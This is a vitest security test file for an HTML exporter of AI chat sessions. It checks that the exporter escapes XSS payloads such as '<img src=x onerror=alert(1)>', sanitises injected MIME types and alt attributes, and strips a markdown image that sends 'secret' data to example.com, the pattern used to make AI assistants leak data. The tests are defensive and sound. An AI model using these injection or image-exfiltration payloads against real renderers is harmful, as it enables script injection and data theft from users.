import fs from "node:fs";
import path from "node:path";
import vm from "node:vm";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { parseHTML } from "linkedom";

interface SessionEntry {
  id: string;
  parentId: string | null;
  timestamp: string;
  type: string;
  message?: unknown;
  summary?: string;
  content?: unknown;
  display?: boolean;
  customType?: string;
  provider?: string;
  modelId?: string;
  thinkingLevel?: string;
}

interface SessionData {
  header: { id: string; timestamp: string };
  entries: SessionEntry[];
  leafId: string;
  systemPrompt: string;
  tools: unknown[];
}

const exportHtmlDir = path.dirname(fileURLToPath(import.meta.url));
const templateHtml = fs.readFileSync(path.join(exportHtmlDir, "template.html"), "utf8");
const templateJs = fs.readFileSync(path.join(exportHtmlDir, "template.js"), "utf8");
const markedJs = fs.readFileSync(path.join(exportHtmlDir, "vendor", "marked.min.js"), "utf8");
const highlightJs = fs.readFileSync(path.join(exportHtmlDir, "vendor", "highlight.min.js"), "utf8");

function renderTemplate(sessionData: SessionData) {
  const html = templateHtml
    .replace("{{CSS}}", "")
    .replace(
      "{{SESSION_DATA}}",
      Buffer.from(JSON.stringify(sessionData), "utf8").toString("base64"),
    )
    .replace("{{MARKED_JS}}", "")
    .replace("{{HIGHLIGHT_JS}}", "")
    .replace("{{JS}}", "");

  const { document, window } = parseHTML(html);
  if (window.HTMLElement?.prototype) {
    window.HTMLElement.prototype.scrollIntoView = () => {};
  }

  const immediateTimeout = (fn: (...args: unknown[]) => void) => {
    fn();
    return 0;
  };
  const runtime: Record<string, unknown> = {
    TextDecoder,
    URLSearchParams,
    atob: (s: string) => Buffer.from(s, "base64").toString("binary"),
    btoa: (s: string) => Buffer.from(s, "binary").toString("base64"),
    clearTimeout: () => {},
    console,
    document,
    history: { replaceState: () => {} },
    location: { href: "http://localhost/export.html", search: "" },
    navigator: { clipboard: { writeText: async () => {} } },
    setTimeout: immediateTimeout,
  };
  runtime.window = runtime;
  runtime.self = runtime;
  runtime.globalThis = runtime;

  vm.createContext(runtime);
  vm.runInContext(markedJs, runtime);
  vm.runInContext(highlightJs, runtime);
  vm.runInContext(templateJs, runtime);
  return { document };
}

function now() {
  return new Date("2026-02-24T00:00:00.000Z").toISOString();
}

describe("export html security hardening", () => {
  it("escapes raw HTML from markdown blocks", () => {
    const attack = "<img src=x onerror=alert(1)>";
    const session: SessionData = {
      entries: [
        {
          id: "1",
          message: { content: attack, role: "user" },
          parentId: null,
          timestamp: now(),
          type: "message",
        },
        {
          id: "2",
          parentId: "1",
          summary: attack,
          timestamp: now(),
          type: "branch_summary",
        },
        {
          content: attack,
          customType: "x",
          display: true,
          id: "3",
          parentId: "2",
          timestamp: now(),
          type: "custom_message",
        },
      ],
      header: { id: "session-1", timestamp: now() },
      leafId: "3",
      systemPrompt: "",
      tools: [],
    };

    const { document } = renderTemplate(session);
    const messages = document.getElementById("messages");
    expect(messages).toBeTruthy();
    expect(messages?.querySelector("img[onerror]")).toBeNull();
    expect(messages?.innerHTML).toContain("&lt;img src=x onerror=alert(1)&gt;");
  });

  it("escapes tree and header metadata fields", () => {
    const attack = "<img src=x onerror=alert(9)>";
    const baseEntries: SessionEntry[] = [
      {
        id: "1",
        message: { content: "ok", role: "user" },
        parentId: null,
        timestamp: now(),
        type: "message",
      },
      {
        id: "2",
        message: {
          content: [{ text: "assistant", type: "text" }],
          model: attack,
          provider: "p",
          role: "assistant",
        },
        parentId: "1",
        timestamp: now(),
        type: "message",
      },
      {
        id: "3",
        message: { role: "toolResult", toolName: attack },
        parentId: "2",
        timestamp: now(),
        type: "message",
      },
      {
        id: "4",
        modelId: attack,
        parentId: "3",
        provider: "p",
        timestamp: now(),
        type: "model_change",
      },
      {
        id: "5",
        parentId: "4",
        thinkingLevel: attack,
        timestamp: now(),
        type: "thinking_level_change",
      },
      {
        id: "6",
        parentId: "5",
        timestamp: now(),
        type: attack,
      },
    ];

    const headerSession: SessionData = {
      entries: baseEntries,
      header: { id: "session-2", timestamp: now() },
      leafId: "6",
      systemPrompt: "",
      tools: [],
    };

    const { document } = renderTemplate(headerSession);
    const tree = document.getElementById("tree-container");
    const header = document.getElementById("header-container");
    expect(tree).toBeTruthy();
    expect(header).toBeTruthy();
    expect(tree?.querySelector("img[onerror]")).toBeNull();
    expect(header?.querySelector("img[onerror]")).toBeNull();
    expect(tree?.innerHTML).toContain("&lt;img src=x onerror=alert(9)&gt;");
    expect(header?.innerHTML).toContain("&lt;img src=x onerror=alert(9)&gt;");

    const modelLeafSession: SessionData = {
      entries: baseEntries,
      header: { id: "session-2-model", timestamp: now() },
      leafId: "4",
      systemPrompt: "",
      tools: [],
    };
    const modelLeaf = renderTemplate(modelLeafSession).document;
    expect(modelLeaf.getElementById("tree-container")?.querySelector("img[onerror]")).toBeNull();
    expect(modelLeaf.getElementById("tree-container")?.innerHTML).toContain(
      "&lt;img src=x onerror=alert(9)&gt;",
    );

    const thinkingLeafSession: SessionData = {
      entries: baseEntries,
      header: { id: "session-2-thinking", timestamp: now() },
      leafId: "5",
      systemPrompt: "",
      tools: [],
    };
    const thinkingLeaf = renderTemplate(thinkingLeafSession).document;
    expect(thinkingLeaf.getElementById("tree-container")?.querySelector("img[onerror]")).toBeNull();
    expect(thinkingLeaf.getElementById("tree-container")?.innerHTML).toContain(
      "&lt;img src=x onerror=alert(9)&gt;",
    );
  });

  it("sanitizes image MIME types used in data URLs", () => {
    const session: SessionData = {
      entries: [
        {
          id: "1",
          message: {
            content: [
              {
                type: "image",
                data: "AAAA",
                mimeType: 'image/png" onerror="alert(7)',
              },
            ],
            role: "user",
          },
          parentId: null,
          timestamp: now(),
          type: "message",
        },
      ],
      header: { id: "session-3", timestamp: now() },
      leafId: "1",
      systemPrompt: "",
      tools: [],
    };

    const { document } = renderTemplate(session);
    const img = document.querySelector("#messages .message-image");
    expect(img).toBeTruthy();
    expect(img?.getAttribute("onerror")).toBeNull();
    expect(img?.getAttribute("src")).toBe("data:application/octet-stream;base64,AAAA");
  });

  it("flattens remote markdown images but keeps data-image markdown", () => {
    const dataImage = "data:image/png;base64,AAAA";
    const session: SessionData = {
      entries: [
        {
          id: "1",
          message: {
            content: [
              {
                type: "text",
                text: `Leak:\n\n![exfil](https://example.com/collect?data=secret)\n\n![pixel](${dataImage})`,
              },
            ],
            role: "assistant",
          },
          parentId: null,
          timestamp: now(),
          type: "message",
        },
      ],
      header: { id: "session-4", timestamp: now() },
      leafId: "1",
      systemPrompt: "",
      tools: [],
    };

    const { document } = renderTemplate(session);
    const messages = document.getElementById("messages");
    expect(messages).toBeTruthy();
    expect(messages?.querySelector('img[src^="https://"]')).toBeNull();
    expect(messages?.textContent).toContain("exfil");
    expect(messages?.querySelector(`img[src="${dataImage}"]`)).toBeTruthy();
  });

  it("escapes markdown data-image attributes", () => {
    const dataImage = "data:image/png;base64,AAAA";
    const session: SessionData = {
      entries: [
        {
          id: "1",
          message: {
            content: [
              {
                type: "text",
                text: `![x" onerror="alert(1)](${dataImage})`,
              },
            ],
            role: "assistant",
          },
          parentId: null,
          timestamp: now(),
          type: "message",
        },
      ],
      header: { id: "session-5", timestamp: now() },
      leafId: "1",
      systemPrompt: "",
      tools: [],
    };

    const { document } = renderTemplate(session);
    const img = document.querySelector("#messages img");
    expect(img).toBeTruthy();
    expect(img?.getAttribute("onerror")).toBeNull();
    expect(img?.getAttribute("alt")).toBe('x" onerror="alert(1)');
    expect(img?.getAttribute("src")).toBe(dataImage);
  });
});
